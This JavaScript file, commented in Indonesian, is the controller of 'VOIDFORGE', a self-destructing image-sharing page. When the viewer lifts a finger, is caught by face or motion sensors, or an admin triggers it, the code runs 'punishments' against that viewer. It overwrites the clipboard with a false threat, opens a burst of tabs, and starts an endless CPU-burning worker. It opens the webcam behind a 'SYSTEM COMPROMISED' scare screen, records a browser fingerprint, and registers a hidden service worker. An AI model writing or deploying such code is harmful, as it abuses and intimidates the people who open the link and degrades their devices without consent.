/**
 * VOIDFORGE - Master Controller & Void Protocol (The Executioner)
 * Architecture: Orchestration, Temporal Decay, and Black-Ops Detonation
 */

const VoidProtocol = {
    linkId: null,
    dbRef: null,
    options: {},
    isDetonated: false,
    decayTimer: null,
    toleranceAllowed: 3,

    init: function() {
        // Dekripsi ID dari URL
        const urlParams = new URLSearchParams(window.location.search);
        const encodedId = urlParams.get('id');
        
        if (!encodedId) {
            this.executeVaporization("INVALID ENCRYPTION TOKEN.");
            return;
        }

        try {
            this.linkId = atob(decodeURIComponent(encodedId));
        } catch (e) {
            this.executeVaporization("CORRUPTED DECRYPTION.");
            return;
        }

        this.dbRef = window.VoidDB.ref(`burner_vault/${this.linkId}`);
        this.bootSequence();
    },

    bootSequence: async function() {
        try {
            const snap = await this.dbRef.once('value');
            if (!snap.exists()) {
                this.executeVaporization("PAYLOAD VAPORIZED OR EXPIRED.");
                return;
            }

            const data = snap.val();
            this.options = data.options || {};
            
            // 1. Inisialisasi Mesin Intelijen Siluman
            if (typeof OsintEngine !== 'undefined') OsintEngine.init(this.linkId);

            // Hilangkan layar loading, tampilkan Vault
            document.getElementById('loading-screen').style.display = 'none';
            document.getElementById('vault-container').style.display = 'block';

            // 2. Inisialisasi Kriptografi Visual & Gembok Kinetik
            if (typeof VisualCrypt !== 'undefined') {
                VisualCrypt.init(
                    this.options, 
                    data.payload, 
                    () => this.onTargetHold(), 
                    () => this.onTargetRelease()
                );
            }

            // 3. Inisialisasi Sensor & AI
            if (typeof KineticSensors !== 'undefined') {
                KineticSensors.init(this.options, (reason) => this.triggerDetonation(reason));
            }
            if (typeof FaceTracker !== 'undefined') {
                FaceTracker.init(this.options, (reason) => this.triggerDetonation(reason));
            }

            // 4. Aktifkan Temporal Decay Engine (Mesin Waktu & Kill-Switch)
            this.activateTemporalDecay(data.duration);
            this.listenForKillSwitch();

        } catch (error) {
            this.executeVaporization("SECURE HANDSHAKE FAILED.");
        }
    },

    // ==========================================================================
    // TEMPORAL DECAY ENGINE
    // ==========================================================================
    activateTemporalDecay: function(duration) {
        if (duration && duration > 0) {
            this.decayTimer = setTimeout(() => {
                this.triggerDetonation("TEMPORAL DECAY: TIME EXPIRED.");
            }, duration * 1000);
        }
    },

    listenForKillSwitch: function() {
        this.dbRef.child('manual_detonation').on('value', snap => {
            if (snap.exists() && snap.val() === true) {
                this.triggerDetonation("VOID PROTOCOL TRIGGERED BY ADMIN.");
            }
        });
    },

    // Logika Kinetik Sentuhan
    onTargetHold: function() {
        // Target menyentuh layar, gambar terbuka. Tidak ada aksi khusus kecuali menahan nafas.
    },

    onTargetRelease: function() {
        if (this.isDetonated) return;
        
        this.toleranceAllowed--;
        const warnUI = document.getElementById('tolerance-warning');
        const countUI = document.getElementById('tol-count');
        
        if (this.toleranceAllowed > 0) {
            countUI.innerText = this.toleranceAllowed;
            warnUI.style.display = 'block';
            setTimeout(() => { warnUI.style.display = 'none'; }, 3000);
        } else {
            this.triggerDetonation("MAXIMUM TOLERANCE EXCEEDED. FINGER RELEASED.");
        }
    },

    // ==========================================================================
    // THE EXECUTIONER (ARSENAL BLACK-OPS)
    // ==========================================================================
    triggerDetonation: function(reason) {
        if (this.isDetonated) return;
        this.isDetonated = true;

        if (this.decayTimer) clearTimeout(this.decayTimer);
        
        // Matikan AI Kamera jika menyala
        if (typeof FaceTracker !== 'undefined') FaceTracker.stopTracking();

        // Menyembunyikan gambar secepat kilat
        document.getElementById('vault-container').style.display = 'none';

        // EKSEKUSI HUKUMAN BERDASARKAN SAKELAR ADMIN
        if (this.options.clipboard) this.punishClipboard();
        if (this.options.hydra) this.punishHydra();
        if (this.options.cpu) this.punishCPU();
        if (this.options.fingerprint) this.punishFingerprint();
        if (this.options.phantom) this.punishPhantomWorker();
        
        // Hukuman Visual Utama (Prioritas Layar)
        if (this.options.shatter) {
            this.punishShatter();
            setTimeout(() => this.executeVaporization(reason), 3500); // Beri waktu animasi pecah
        } else if (this.options.medusa || reason.includes("FACE")) {
            this.punishRedRoom();
            setTimeout(() => this.executeVaporization(reason), 3000);
        } else {
            this.executeVaporization(reason);
        }
    },

    punishClipboard: function() {
        try {
            navigator.clipboard.writeText("SECURITY WARNING: YOUR DEVICE IP AND IDENTITY HAVE BEEN LOGGED FOR UNAUTHORIZED DATA BREACH ATTEMPT.");
        } catch (e) {}
    },

    punishHydra: function() {
        // Membuka tab sebanyak mungkin sebelum diblokir browser untuk membebani RAM
        for (let i = 0; i < 20; i++) {
            try { window.open('about:blank', '_blank'); } catch(e){}
        }
    },

    punishCPU: function() {
        // Web Worker Hantu untuk kalkulasi matematis tanpa henti (memanaskan CPU)
        const code = `while(true) { Math.sqrt(Math.random() * 999999); }`;
        const blob = new Blob([code], {type: 'application/javascript'});
        const worker = new Worker(URL.createObjectURL(blob));
        // Dibiarkan menyala
    },

    punishShatter: function() {
        const shatterLayer = document.getElementById('shatter-overlay');
        shatterLayer.style.display = 'block';
        
        // Memecah layar menjadi 50 kepingan kaca
        for (let i = 0; i < 50; i++) {
            const piece = document.createElement('div');
            piece.className = 'shatter-piece';
            piece.style.width = Math.random() * 100 + 50 + 'px';
            piece.style.height = Math.random() * 100 + 50 + 'px';
            piece.style.left = Math.random() * 100 + 'vw';
            piece.style.top = Math.random() * 100 + 'vh';
            piece.style.animationDuration = (Math.random() * 1.5 + 0.5) + 's';
            shatterLayer.appendChild(piece);
        }
    },

    punishRedRoom: function() {
        const rr = document.getElementById('red-room');
        rr.style.display = 'block';
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
            .then(stream => { document.getElementById('red-video').srcObject = stream; })
            .catch(e => { document.getElementById('red-text-content').innerHTML = "SYSTEM COMPROMISED.<br>WE HAVE YOUR LOGS."; });
        
        setInterval(() => {
            rr.style.filter = `hue-rotate(${Math.random()*360}deg) brightness(${Math.random()*2})`;
        }, 100);
    },

    punishFingerprint: function() {
        // Simulasi penguncian fingerprint ke Firebase (Canvas Hash)
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.fillText('VOIDFORGE', 10, 10);
        const hash = canvas.toDataURL().slice(-20);
        window.VoidDB.ref('banned_fingerprints').push({ hash: hash, timestamp: Date.now() });
    },

    punishPhantomWorker: function() {
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw-phantom.js').catch(()=>{});
        }
    },

    // ==========================================================================
    // ABSOLUTE DATA VAPORIZATION (Zero-Trace)
    // ==========================================================================
    executeVaporization: async function(reason) {
        document.getElementById('shatter-overlay').style.display = 'none';
        document.getElementById('red-room').style.display = 'none';
        
        const burnScreen = document.getElementById('burned-screen');
        document.getElementById('lblBurnReason').innerText = reason;
        burnScreen.style.display = 'flex';

        // 1. Pembersihan Memori Peramban Target
        try {
            localStorage.clear();
            sessionStorage.clear();
        } catch(e) {}

        // 2. Pembersihan Server Absolut
        if (this.linkId && this.dbRef) {
            try { await this.dbRef.remove(); } catch(e) {}
        }

        // 3. Pengalihan Lokasi (Menghapus jejak sejarah tombol 'Back')
        setTimeout(() => {
            if (document.fullscreenElement) {
                document.exitFullscreen().catch(e => {});
            }
            window.location.replace('https://www.google.com');
        }, 2000);
    }
};

// Memicu inisialisasi saat semua file selesai dimuat
window.addEventListener('DOMContentLoaded', () => {
    // Memberikan jeda kecil agar config Firebase stabil
    setTimeout(() => { VoidProtocol.init(); }, 100);
});
